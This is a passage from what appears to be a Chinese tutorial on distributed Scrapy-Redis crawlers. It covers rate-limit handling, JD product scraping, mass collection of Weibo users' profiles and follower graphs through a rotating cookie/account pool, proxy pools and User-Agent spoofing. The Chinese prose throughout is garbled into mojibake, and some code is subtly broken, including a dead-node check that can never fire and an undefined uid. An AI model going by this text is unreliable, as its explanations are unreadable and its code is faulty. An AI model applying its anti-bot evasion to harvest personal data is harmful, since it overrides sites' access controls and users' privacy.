<p><strong>3. æ™ºèƒ½é™é€Ÿ</strong>ï¼š</p>
<pre><code class="language-python">class AutoThrottleMiddleware:
    &quot;&quot;&quot;æ ¹æ®æœåŠ¡å™¨å“åº”åŠ¨æ€è°ƒæ•´è¯·æ±‚é€Ÿåº¦&quot;&quot;&quot;

    def process_response(self, request, response, spider):
        if response.status == 429:  # Too Many Requests
            # æ£€æµ‹åˆ°é™é€Ÿï¼Œé™ä½é€Ÿåº¦
            spider.crawler.engine.downloader.total_concurrency.value -= 5
            spider.logger.warning('Detected rate limiting, reducing concurrency')
        elif response.status == 200:
            # æ­£å¸¸å“åº”ï¼Œå¯ä»¥é€‚å½“æé€Ÿ
            current = spider.crawler.engine.downloader.total_concurrency.value
            if current &lt; 64:
                spider.crawler.engine.downloader.total_concurrency.value += 1

        return response
</code></pre>
<h4>å®é™…æ•ˆæœ</h4>
<p><strong>çˆ¬å–ç»Ÿè®¡ï¼ˆ30 å¤©è¿è¡Œæ•°æ®ï¼‰</strong>ï¼š</p>
<ul>
<li><strong>æ€»å•†å“æ•°</strong>ï¼š5,247,893 ä»¶</li>
<li><strong>æ€»è¯„è®ºæ•°</strong>ï¼š128,562,417 æ¡</li>
<li><strong>å¹³å‡çˆ¬å–é€Ÿåº¦</strong>ï¼š320 å•†å“/åˆ†é’Ÿ</li>
<li><strong>é”™è¯¯ç‡</strong>ï¼š&lt; 0.5%</li>
<li><strong>é‡å¤ç‡</strong>ï¼š&lt; 0.01%ï¼ˆBloom Filter è¯¯åˆ¤ç‡ï¼‰</li>
<li><strong>æ•°æ®å®Œæ•´æ€§</strong>ï¼š&gt; 99.5%</li>
</ul>
<p><strong>æˆæœ¬åˆ†æ</strong>ï¼š</p>
<ul>
<li><strong>æœåŠ¡å™¨æˆæœ¬</strong>ï¼š1 å° Masterï¼ˆ4 æ ¸ 8Gï¼‰+ 4 å° Slaveï¼ˆ2 æ ¸ 4Gï¼‰</li>
<li><strong>å­˜å‚¨æˆæœ¬</strong>ï¼šMongoDB é›†ç¾¤ 500GBï¼ˆå«è¯„è®ºæ•°æ®ï¼‰</li>
<li><strong>ç½‘ç»œå¸¦å®½</strong>ï¼šæ¯èŠ‚ç‚¹ 10Mbpsï¼Œæ€»è®¡ 40Mbps</li>
<li><strong>æœˆåº¦æˆæœ¬</strong>ï¼šçº¦ $800ï¼ˆäº‘æœåŠ¡å™¨ï¼‰</li>
</ul>
<p><strong>å‚è€ƒæ¥æº</strong>ï¼š</p>
<ul>
<li><a href="https://blog.csdn.net/weixin_52392194/article/details/141000827">åƒä¸‡çº§åˆ†å¸ƒå¼çˆ¬è™«ï¼šScrapy-Redis æ·±å…¥è§£æ</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/28926308">äº¬ä¸œåˆ†å¸ƒå¼çˆ¬è™«å®è·µã€æ¶æ„ã€æºç </a></li>
<li><a href="https://www.imooc.com/article/48414">Scrapy+Redis+MySQL åˆ†å¸ƒå¼çˆ¬å–å•†å“ä¿¡æ¯</a></li>
</ul>
<h3>ç¤ºä¾‹ 4ï¼šçœŸå®æ¡ˆä¾‹ - æ–°æµªå¾®åšç”¨æˆ·ä¿¡æ¯çˆ¬è™«</h3>
<p><strong>é¡¹ç›®èƒŒæ™¯</strong>ï¼šé‡‡é›†æ–°æµªå¾®åšç”¨æˆ·çš„ä¸ªäººä¿¡æ¯ã€å¾®åšå†…å®¹ã€ç²‰ä¸å’Œå…³æ³¨å…³ç³»ï¼Œç”¨äºç¤¾äº¤ç½‘ç»œåˆ†æã€‚</p>
<p><strong>æŠ€æœ¯æ ˆ</strong>ï¼šScrapy + Scrapy-Redis + MongoDB + Graphiteï¼ˆç›‘æ§ï¼‰</p>
<p><strong>æ€§èƒ½æ•°æ®</strong>ï¼š</p>
<ul>
<li><strong>ç”¨æˆ·è§„æ¨¡</strong>ï¼š2000 ä¸‡+ ç”¨æˆ·</li>
<li><strong>å¾®åšæ•°é‡</strong>ï¼š5 äº¿+ æ¡å¾®åš</li>
<li><strong>çˆ¬å–å‘¨æœŸ</strong>ï¼šæŒç»­è¿è¡Œ 3 ä¸ªæœˆ</li>
<li><strong>å¹³å‡é€Ÿåº¦</strong>ï¼šçº¦ 150 ç”¨æˆ·/åˆ†é’Ÿ</li>
<li><strong>å­˜å‚¨å¤§å°</strong>ï¼šMongoDB é›†ç¾¤ 2TB+</li>
</ul>
<p><strong>æ ¸å¿ƒæŒ‘æˆ˜</strong>ï¼š</p>
<ol>
<li><strong>åçˆ¬è™«å¯¹æŠ—</strong>ï¼šå¾®åšæœ‰ä¸¥æ ¼çš„è®¿é—®é¢‘ç‡é™åˆ¶å’Œè´¦å·é£æ§</li>
<li><strong>å…³ç³»ç½‘ç»œå¤æ‚</strong>ï¼šéœ€è¦å¤„ç†ç”¨æˆ·ä¹‹é—´çš„å…³æ³¨/ç²‰ä¸å…³ç³»</li>
<li><strong>æ•°æ®é‡å·¨å¤§</strong>ï¼šéœ€è¦é«˜æ•ˆçš„å­˜å‚¨å’Œå»é‡æ–¹æ¡ˆ</li>
</ol>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="language-python"># ä½¿ç”¨è´¦å·æ± è½®æ¢
class WeiboSpider(RedisSpider):
    name = 'weibo'

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.account_pool = AccountPool()  # è´¦å·æ± ç®¡ç†

    def start_requests(self):
        # ä»è´¦å·æ± è·å– cookie
        cookies = self.account_pool.get_cookie()
        for url in self.start_urls:
            yield scrapy.Request(url, cookies=cookies)

    def parse_user(self, response):
        # è§£æç”¨æˆ·ä¿¡æ¯
        user_item = UserItem()
        user_item['uid'] = response.meta['uid']
        user_item['nickname'] = response.css('div.name::text').get()
        # ... å…¶ä»–å­—æ®µ

        yield user_item

        # çˆ¬å–ç²‰ä¸å’Œå…³æ³¨
        followers_url = f'https://weibo.com/ajax/friendships/followers?uid={uid}'
        yield scrapy.Request(followers_url, callback=self.parse_followers)
</code></pre>
<p><strong>å‚è€ƒæ¥æº</strong>ï¼š</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/25172216">Python çˆ¬è™«å®æˆ˜é¡¹ç›®ä»£ç å¤§å…¨</a></li>
<li><a href="https://gitee.com/alienwu/WebCrawlProject">WebCrawlProjectï¼šçœŸå®çˆ¬è™«é¡¹ç›®é›†åˆ</a></li>
</ul>
<hr />
<h2>æœ€ä½³å®è·µ</h2>
<h3>1. æ¶æ„è®¾è®¡</h3>
<p><strong>æ¨èæ¶æ„ç»„ä»¶ï¼š</strong></p>
<ul>
<li><strong>ä»»åŠ¡é˜Ÿåˆ—</strong>ï¼šRedisï¼ˆå°è§„æ¨¡ï¼‰æˆ– Kafka/RabbitMQï¼ˆå¤§è§„æ¨¡ï¼‰</li>
<li><strong>å»é‡å­˜å‚¨</strong>ï¼šRedis Bloom Filterï¼ˆå†…å­˜å……è¶³æ—¶ç”¨ Redis Setï¼‰</li>
<li><strong>æ•°æ®å­˜å‚¨</strong>ï¼šMongoDBï¼ˆçµæ´»ï¼‰/ MySQLï¼ˆç»“æ„åŒ–ï¼‰/ Elasticsearchï¼ˆæœç´¢ï¼‰</li>
<li><strong>ç›‘æ§</strong>ï¼šPrometheus + Grafana / ELK Stack</li>
<li><strong>é…ç½®ç®¡ç†</strong>ï¼šConsul / etcd</li>
</ul>
<h3>2. æ€§èƒ½ä¼˜åŒ–</h3>
<p><strong>å¹¶å‘æ§åˆ¶ï¼š</strong></p>
<pre><code class="language-python"># settings.py
CONCURRENT_REQUESTS = 100              # å…¨å±€å¹¶å‘
CONCURRENT_REQUESTS_PER_DOMAIN = 16    # å•åŸŸåå¹¶å‘
CONCURRENT_REQUESTS_PER_IP = 16        # å• IP å¹¶å‘

# ä¸‹è½½å»¶è¿Ÿ
DOWNLOAD_DELAY = 0.25
RANDOMIZE_DOWNLOAD_DELAY = True

# å¯ç”¨è‡ªåŠ¨é™é€Ÿ
AUTOTHROTTLE_ENABLED = True
AUTOTHROTTLE_START_DELAY = 0.5
AUTOTHROTTLE_MAX_DELAY = 10
AUTOTHROTTLE_TARGET_CONCURRENCY = 100
</code></pre>
<p><strong>è¿æ¥æ± ä¼˜åŒ–ï¼š</strong></p>
<pre><code class="language-python"># å¢åŠ  Redis è¿æ¥æ± å¤§å°
REDIS_PARAMS = {
    'socket_keepalive': True,
    'socket_keepalive_options': {
        socket.TCP_KEEPIDLE: 60,
        socket.TCP_KEEPINTVL: 10,
        socket.TCP_KEEPCNT: 3,
    },
    'health_check_interval': 30,
    'max_connections': 100,
}
</code></pre>
<h3>3. å®¹é”™å¤„ç†</h3>
<p><strong>è¯·æ±‚é‡è¯•ï¼š</strong></p>
<pre><code class="language-python"># settings.py
RETRY_ENABLED = True
RETRY_TIMES = 3
RETRY_HTTP_CODES = [500, 502, 503, 504, 408, 429]
</code></pre>
<p><strong>èŠ‚ç‚¹ç›‘æ§å’Œè‡ªåŠ¨æ¢å¤ï¼š</strong></p>
<pre><code class="language-python">import redis
import time
from datetime import datetime

class NodeMonitor:
    def __init__(self):
        self.r = redis.Redis()
        self.node_id = socket.gethostname()

    def register_node(self):
        &quot;&quot;&quot;æ³¨å†ŒèŠ‚ç‚¹&quot;&quot;&quot;
        self.r.setex(f'node:{self.node_id}', 60, datetime.now().isoformat())

    def heartbeat(self):
        &quot;&quot;&quot;å®šæœŸå‘é€å¿ƒè·³&quot;&quot;&quot;
        while True:
            try:
                self.register_node()
                time.sleep(30)
            except Exception as e:
                print(f&quot;Heartbeat failed: {e}&quot;)
                time.sleep(5)

    def check_dead_nodes(self):
        &quot;&quot;&quot;æ£€æŸ¥å¤±æ•ˆèŠ‚ç‚¹&quot;&quot;&quot;
        for key in self.r.scan_iter('node:*'):
            if not self.r.exists(key):
                node_id = key.decode().split(':')[1]
                print(f&quot;Node {node_id} is dead&quot;)
                # é‡æ–°åˆ†é…è¯¥èŠ‚ç‚¹çš„ä»»åŠ¡
                self.redistribute_tasks(node_id)
</code></pre>
<h3>4. å®‰å…¨å’Œåˆè§„</h3>
<p><strong>IP è½®æ¢ï¼š</strong></p>
<pre><code class="language-python"># settings.py
DOWNLOADER_MIDDLEWARES = {
    'crawler.middlewares.ProxyMiddleware': 100,
}

# ä»£ç†æ± é…ç½®
PROXY_POOL_URL = 'http://proxy-pool.example.com/get'
</code></pre>
<p><strong>User-Agent è½®æ¢ï¼š</strong></p>
<pre><code class="language-python"># middlewares.py
from scrapy.downloadermiddlewares.useragent import UserAgentMiddleware
import random

class RandomUserAgentMiddleware(UserAgentMiddleware):
    def __init__(self, user_agent=''):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...',
            'Mozilla/5.0 (X11; Linux x86_64)...',
        ]

    def process_request(self, request, spider):
        request.headers['User-Agent'] = random.choice(self.user_agents)
</code></pre>
<p><strong>è¯·æ±‚é¢‘ç‡é™åˆ¶ï¼š</strong></p>
<pre><code class="language-python"># settings.py
DOWNLOAD_DELAY = 1
AUTOTHROTTLE_ENABLED = True
AUTOTHROTTLE_TARGET_CONCURRENCY = 2.0

# ä½¿ç”¨ä»¤ç‰Œæ¡¶é™æµ
from scrapy.extensions.throttle import AutoThrottle
</code></pre>
<h3>5. ç›‘æ§å’Œæ—¥å¿—</h3>
<p><strong>Prometheus æŒ‡æ ‡é‡‡é›†ï¼š</strong></p>
<pre><code class="language-python">from prometheus_client import Counter, Histogram, Gauge
import time

# å®šä¹‰æŒ‡æ ‡
requests_total = Counter('crawler_requests_total', 'Total requests', ['spider', 'status'])
request_duration = Histogram('crawler_request_duration_seconds', 'Request duration')
queue_size = Gauge('crawler_queue_size', 'Queue size', ['spider'])

class MetricsMiddleware:
    def process_request(self, request, spider):
        request.meta['start_time'] = time.time()

    def process_response(self, request, response, spider):
        duration = time.time() - request.meta.get('start_time', time.time())
        request_duration.observe(duration)
        requests_total.labels(spider=spider.name, status=response.status).inc()
        return response
</code></pre>
<hr />
<h2>å¸¸è§é—®é¢˜</h2>
<h3>Q: åˆ†å¸ƒå¼çˆ¬è™«å¦‚ä½•ä¿è¯æ•°æ®ä¸é‡å¤ï¼Ÿ</h3>
<p><strong>A</strong>: ä¸»è¦é€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p>
<ol>
<li><strong>URL å»é‡</strong>ï¼šä½¿ç”¨ Redis Set æˆ– Bloom Filter è®°å½•å·²çˆ¬å–çš„ URL</li>
<li><strong>æ•°æ®å»é‡</strong>ï¼šåœ¨å­˜å‚¨æ—¶ä½¿ç”¨å”¯ä¸€ç´¢å¼•ï¼ˆå¦‚ URLï¼‰è¿›è¡Œ upsert æ“ä½œ</li>
<li><strong>åˆ†å¸ƒå¼é”</strong>ï¼šå¯¹äºéœ€è¦åŸå­æ“ä½œçš„åœºæ™¯ï¼Œä½¿ç”¨ Redis åˆ†å¸ƒå¼é”</li>
</ol>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="language-python"># MongoDB ä½¿ç”¨å”¯ä¸€ç´¢å¼•
collection.create_index('url', unique=True)
collection.update_one({'url': url}, {'$set': data}, upsert=True)

# MySQL ä½¿ç”¨ ON DUPLICATE KEY UPDATE
INSERT INTO news (url, title, content)
VALUES (%s, %s, %s)
ON DUPLICATE KEY UPDATE title=%s, content=%s
</code></pre>
<h3>Q: å¦‚ä½•å¤„ç†åŠ¨æ€ IP å°ç¦ï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<ol>
<li><strong>ä»£ç†æ± </strong>ï¼šç»´æŠ¤å¤§é‡ä»£ç† IPï¼ŒåŠ¨æ€è½®æ¢</li>
<li><strong>IP æ± æ£€æµ‹</strong>ï¼šå®šæœŸæ£€æµ‹ä»£ç†å¯ç”¨æ€§ï¼Œå‰”é™¤å¤±æ•ˆä»£ç†</li>
<li><strong>æ™ºèƒ½é‡è¯•</strong>ï¼šè¯·æ±‚å¤±è´¥æ—¶æ›´æ¢ä»£ç†é‡è¯•</li>
<li><strong>é™é€Ÿç­–ç•¥</strong>ï¼šæ£€æµ‹åˆ°å°ç¦æ—¶è‡ªåŠ¨é™ä½è¯·æ±‚é¢‘ç‡</li>
</ol>
<pre><code class="language-python">class ProxyMiddleware:
    def __init__(self):
        self.proxy_pool = ProxyPool()

    def process_request(self, request, spider):
        if request.meta.get('retry_times', 0) &gt; 0:
            # é‡è¯•æ—¶æ›´æ¢ä»£ç†
            proxy = self.proxy_pool.get_proxy()
            request.meta['proxy'] = proxy

    def process_exception(self, request, exception, spider):
        # ä»£ç†å¤±è´¥ï¼Œæ ‡è®°ä¸ºä¸å¯ç”¨
        proxy = request.meta.get('proxy')
        if proxy:
            self.proxy_pool.mark_invalid(proxy)
        return request  # é‡æ–°è°ƒåº¦è¯·æ±‚
</code></pre>
<h3>Q: å¦‚ä½•ç›‘æ§çˆ¬è™«è¿è¡ŒçŠ¶æ€ï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<ol>
<li><p><strong>å®æ—¶æŒ‡æ ‡</strong>ï¼š</p>
<ul>
<li>çˆ¬å–é€Ÿåº¦ï¼ˆrequests/ç§’ï¼‰</li>
<li>æˆåŠŸç‡</li>
<li>é˜Ÿåˆ—é•¿åº¦</li>
<li>å»é‡é›†åˆå¤§å°</li>
<li>èŠ‚ç‚¹å­˜æ´»æ•°é‡</li>
</ul>
</li>
<li><p><strong>ç›‘æ§å·¥å…·</strong>ï¼š</p>
<ul>
<li><strong>Scrapy Stats</strong>ï¼šScrapy å†…ç½®ç»Ÿè®¡</li>
<li><strong>Flower</strong>ï¼šCelery ä»»åŠ¡ç›‘æ§</li>
<li><strong>Prometheus + Grafana</strong>ï¼šè‡ªå®šä¹‰æŒ‡æ ‡å¯è§†åŒ–</li>
<li><strong>Redis Monitor</strong>ï¼šRedis æ€§èƒ½ç›‘æ§</li>
</ul>
</li>
<li><p><strong>å‘Šè­¦ç­–ç•¥</strong>ï¼š</p>
<ul>
<li>çˆ¬å–é€Ÿåº¦å¼‚å¸¸</li>
<li>é”™è¯¯ç‡è¶…è¿‡é˜ˆå€¼</li>
<li>é˜Ÿåˆ—ç§¯å‹ä¸¥é‡</li>
<li>èŠ‚ç‚¹æ‰çº¿</li>
</ul>
</li>
</ol>
<h3>Q: åˆ†å¸ƒå¼çˆ¬è™«çš„æˆæœ¬å¦‚ä½•æ§åˆ¶ï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<ol>
<li><p><strong>èµ„æºä¼˜åŒ–</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨ Bloom Filter å‡å°‘å†…å­˜å ç”¨</li>
<li>åˆç†é…ç½®å¹¶å‘æ•°ï¼Œé¿å…è¿‡åº¦æ¶ˆè€—å¸¦å®½</li>
<li>ä½¿ç”¨å¯¹è±¡å­˜å‚¨ï¼ˆOSSï¼‰å­˜å‚¨å›¾ç‰‡ç­‰å¤§æ–‡ä»¶</li>
</ul>
</li>
<li><p><strong>æˆæœ¬ä¼°ç®—</strong>ï¼š</p>
<ul>
<li><strong>Redis å†…å­˜</strong>ï¼š1 äº¿ URL ä½¿ç”¨ Bloom Filter çº¦ 128 MB</li>
<li><strong>å¸¦å®½</strong>ï¼šå‡è®¾æ¯é¡µ 100 KBï¼Œ1000 é¡µ/ç§’ = 100 MB/ç§’</li>
<li><strong>å­˜å‚¨</strong>ï¼šMongoDB æˆ– Elasticsearchï¼ŒæŒ‰å®é™…æ•°æ®é‡è®¡ç®—</li>
</ul>
</li>
<li><p><strong>å¼¹æ€§ä¼¸ç¼©</strong>ï¼š</p>
<ul>
<li>æ ¹æ®ä»»åŠ¡é‡åŠ¨æ€å¢å‡çˆ¬è™«èŠ‚ç‚¹</li>
<li>ä½¿ç”¨ Kubernetes æˆ– Docker Swarm è‡ªåŠ¨è°ƒåº¦</li>
<li>éé«˜å³°æœŸé™ä½èµ„æºä½¿ç”¨</li>
</ul>
</li>
</ol>
<h3>Q: å¦‚ä½•å¤„ç† JavaScript æ¸²æŸ“çš„ç½‘é¡µï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<ol>
<li><p><strong>Selenium/Puppeteer é›†ç¾¤</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨ Selenium Grid æˆ– Browserless æ­å»ºæµè§ˆå™¨é›†ç¾¤</li>
<li>é€šè¿‡ Celery åˆ†å‘æ¸²æŸ“ä»»åŠ¡</li>
</ul>
</li>
<li><p><strong>Scrapy-Splash</strong>ï¼š</p>
<ul>
<li>Splash æ˜¯è½»é‡çº§çš„ JavaScript æ¸²æŸ“æœåŠ¡</li>
<li>æ”¯æŒåˆ†å¸ƒå¼éƒ¨ç½²</li>
</ul>
</li>
</ol>
<pre><code class="language-python"># settings.py
SPLASH_URL = 'http://splash:8050'
DOWNLOADER_MIDDLEWARES = {
    'scrapy_splash.SplashCookiesMiddleware': 723,
    'scrapy_splash.SplashMiddleware': 725,
}

# spider
yield SplashRequest(url, self.parse, args={'wait': 3})
</code></pre>
<ol start="3">
<li><strong>é¢„æ¸²æŸ“æœåŠ¡</strong>ï¼š<ul>
<li>ä½¿ç”¨ Prerender.io ç­‰ç¬¬ä¸‰æ–¹æœåŠ¡</li>
<li>è‡ªå»º Headless Chrome é›†ç¾¤</li>
</ul>
</li>
</ol>
<hr />
<h2>è¿›é˜¶é˜…è¯»</h2>
<h3>å®˜æ–¹æ–‡æ¡£</h3>
<ul>
<li><a href="https://docs.scrapy.org/">Scrapy å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://scrapy-redis.readthedocs.io/">Scrapy-Redis æ–‡æ¡£</a></li>
<li><a href="https://docs.celeryproject.org/">Celery å®˜æ–¹æ–‡æ¡£</a></li>
</ul>
<h3>æŠ€æœ¯åšå®¢</h3>
<ul>
<li><a href="https://bbs.huaweicloud.com/blogs/746d061b414d462b892aa9e80629e380">æ„å»ºé«˜æ•ˆçš„åˆ†å¸ƒå¼çˆ¬è™«ç³»ç»Ÿ - åä¸ºäº‘</a></li>
<li><a href="https://blog.csdn.net/weixin_52392194/article/details/141000827">åƒä¸‡çº§åˆ†å¸ƒå¼çˆ¬è™«ï¼šScrapy-Redis æ·±å…¥è§£æ</a></li>
<li><a href="https://blog.csdn.net/nicajonh/article/details/79918176">Scrapy-Redis ä¸ Celery æ„å»ºåˆ†å¸ƒå¼çˆ¬è™«</a></li>
<li><a href="https://bbs.songma.com/255362.html">Python å¤§è§„æ¨¡æ•°æ®æŠ“å–å®æˆ˜ï¼šäº¿çº§æ•°æ®å»é‡</a></li>
<li><a href="https://blog.csdn.net/qq_41768400/article/details/80976119">åˆ†å¸ƒå¼çˆ¬è™«åŠ Bloom Filter å»é‡</a></li>
<li><a href="https://blog.csdn.net/gitblog_00030/article/details/137066743">Scrapy Redis BloomFilter: æå‡æŠ“å–æ•ˆç‡</a></li>
<li><a href="https://blog.csdn.net/gitblog_00021/article/details/139407129">æ¨èä½¿ç”¨ï¼šScrapy-Redis-BloomFilter å»é‡åˆ©å™¨</a></li>
</ul>
<h3>å¼€æºé¡¹ç›®</h3>
<ul>
<li><a href="https://github.com/scrapy/scrapy">Scrapy</a></li>
<li><a href="https://github.com/rmax/scrapy-redis">Scrapy-Redis</a></li>
<li><a href="https://github.com/Python3WebSpider/ScrapyRedisBloomFilter">Scrapy-Redis-BloomFilter</a></li>
<li><a href="https://github.com/binux/pyspider">PySpider</a></li>
<li><a href="https://github.com/celery/celery">Celery</a></li>
</ul>
<h3>è®ºæ–‡å’Œç ”ç©¶</h3>
<ul>
<li><a href="https://dl.acm.org/doi/10.1145/3184558.3191623">Large-Scale Web Crawling</a></li>
<li><a href="https://arxiv.org/abs/1804.04251">Bloom Filters in Distributed Systems</a></li>
</ul>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-52">ä»£ç†æ± ç®¡ç†</a> - åˆ†å¸ƒå¼çˆ¬è™«çš„ IP ç®¡ç†</li>
<li><a href="#section-53">æ•°æ®å­˜å‚¨æ–¹æ¡ˆ</a> - çˆ¬å–æ•°æ®çš„å­˜å‚¨ç­–ç•¥</li>
<li><a href="#section-54">æ¶ˆæ¯é˜Ÿåˆ—åº”ç”¨</a> - ä»»åŠ¡é˜Ÿåˆ—çš„æ·±å…¥åº”ç”¨</li>
<li><a href="#section-55">Docker éƒ¨ç½²</a> - å®¹å™¨åŒ–éƒ¨ç½²åˆ†å¸ƒå¼çˆ¬è™«</li>
<li><a href="#section-56">ç›‘æ§å’Œå‘Šè­¦</a> - çˆ¬è™«ç³»ç»Ÿç›‘æ§</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-52">
                                                <h2>[R51] Proxy Pool Management</h2>
                                                <h1>R51: ä»£ç†æ± ç®¡ç†</h1>
<h2>æ¦‚è¿°</h2>
<p>ä»£ç†æ± æ˜¯åˆ†å¸ƒå¼çˆ¬è™«çš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ï¼Œç”¨äºçªç ´ IP é™åˆ¶å’Œåçˆ¬è™«æ£€æµ‹ã€‚æœ¬ç« ä»‹ç»ä»£ç†æ± çš„æ„å»ºã€ç®¡ç†å’Œä¼˜åŒ–ç­–ç•¥ã€‚</p>
<hr />
<h2>ä»£ç†ç±»å‹</h2>
<h3>1. HTTP/HTTPS ä»£ç†</h3>
<p>æœ€å¸¸è§çš„ä»£ç†ç±»å‹ã€‚</p>
<pre><code class="language-python">proxies = {
    'http': 'http://proxy_ip:port',
    'https': 'https://proxy_ip:port'
}

response = requests.get(url, proxies=proxies)
</code></pre>
<h3>2. SOCKS ä»£ç†</h3>
<p>æ”¯æŒæ›´å¤šåè®®ï¼Œæ€§èƒ½æ›´å¥½ã€‚</p>
<pre><code class="language-python"># éœ€è¦å®‰è£… requests[socks]
proxies = {
    'http': 'socks5://proxy_ip:port',
    'https': 'socks5://proxy_ip:port'
}
</code></pre>
<h3>3. ä»£ç†åˆ†ç±»</h3>
<p><strong>æŒ‰åŒ¿åæ€§</strong>:</p>
<ul>
<li><strong>é€æ˜ä»£ç†</strong>: ç›®æ ‡æœåŠ¡å™¨èƒ½çœ‹åˆ°çœŸå® IP</li>
<li><strong>åŒ¿åä»£ç†</strong>: éšè—çœŸå® IPï¼Œä½†æš´éœ²ä»£ç†ç‰¹å¾</li>
<li><strong>é«˜åŒ¿ä»£ç†</strong>: å®Œå…¨éšè—ï¼Œæ— ä»£ç†ç‰¹å¾</li>
</ul>
<p><strong>æŒ‰æ¥æº</strong>:</p>
<ul>
<li><strong>å…è´¹ä»£ç†</strong>: ä¸ç¨³å®šï¼Œé€Ÿåº¦æ…¢</li>
<li><strong>ä»˜è´¹ä»£ç†</strong>: ç¨³å®šï¼Œé€Ÿåº¦å¿«</li>
<li><strong>ä½å®…ä»£ç†</strong>: çœŸå®å®¶åº­ IPï¼Œè´¨é‡æœ€é«˜</li>
</ul>
<hr />
<h2>ä»£ç†æ± æ¶æ„</h2>
<pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚        Proxy Fetcher             â”‚
â”‚  - ä»å¤šä¸ªæºè·å–ä»£ç†               â”‚
â”‚  - å…è´¹ä»£ç†ç½‘ç«™                   â”‚
â”‚  - ä»˜è´¹ä»£ç† API                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚       Proxy Validator            â”‚
â”‚  - éªŒè¯ä»£ç†æœ‰æ•ˆæ€§                 â”‚
â”‚  - æµ‹è¯•å“åº”æ—¶é—´                   â”‚
â”‚  - æ£€æŸ¥åŒ¿åæ€§                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚        Redis Storage             â”‚
â”‚  - å¯ç”¨ä»£ç†æ±                      â”‚
â”‚  - ä»£ç†è¯„åˆ†                       â”‚
â”‚  - ä½¿ç”¨ç»Ÿè®¡                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚       Proxy Scheduler            â”‚
â”‚  - æ™ºèƒ½åˆ†é…ä»£ç†                   â”‚
â”‚  - å¤±è´¥é‡è¯•                       â”‚
â”‚  - åŠ¨æ€è°ƒæ•´                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<hr />
<h2>å®Œæ•´å®ç°</h2>
<h3>ä»£ç†æ± ç±»</h3>
<pre><code class="language-python">import requests
import redis
import time
from typing import List
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ProxyPool:
    def __init__(self):
        self.r = redis.Redis(host='localhost', port=6379, decode_responses=True)
        self.test_url = 'http://httpbin.org/ip'
        self.timeout = 5

    def fetch_proxies(self) -&gt; List[str]:
        &quot;&quot;&quot;ä»å¤šä¸ªæºè·å–ä»£ç†&quot;&quot;&quot;
        proxies = []
        proxies.extend(self._fetch_from_free_proxy())
        proxies.extend(self._fetch_from_paid_api())
        return list(set(proxies))

    def _fetch_from_free_proxy(self) -&gt; List[str]:
        &quot;&quot;&quot;ä»å…è´¹ä»£ç†ç½‘ç«™è·å–&quot;&quot;&quot;
        proxies = []
        try:
            response = requests.get('https://www.kuaidaili.com/free/', timeout=10)
            # è§£æé¡µé¢ï¼Œæå–ä»£ç†
        except Exception as e:
            logger.error(f'Fetch free proxy failed: {e}')
        return proxies

    def _fetch_from_paid_api(self) -&gt; List[str]:
        &quot;&quot;&quot;ä»ä»˜è´¹ API è·å–&quot;&quot;&quot;
        proxies = []
        try:
            response = requests.get('http://api.proxy.com/get?num=100', timeout=10)
            data = response.json()
            proxies = [f&quot;{item['ip']}:{item['port']}&quot; for item in data]
        except Exception as e:
            logger.error(f'Fetch paid proxy failed: {e}')
        return proxies

    def validate_proxy(self, proxy: str) -&gt; bool:
        &quot;&quot;&quot;éªŒè¯ä»£ç†å¯ç”¨æ€§&quot;&quot;&quot;
        proxies = {
            'http': f'http://{proxy}',
            'https': f'http://{proxy}'
        }

        try:
            start_time = time.time()
            response = requests.get(
                self.test_url,
                proxies=proxies,
                timeout=self.timeout
            )
            response_time = time.time() - start_time

            if response.status_code == 200:
                self.r.zadd('proxy_pool', {proxy: response_time})
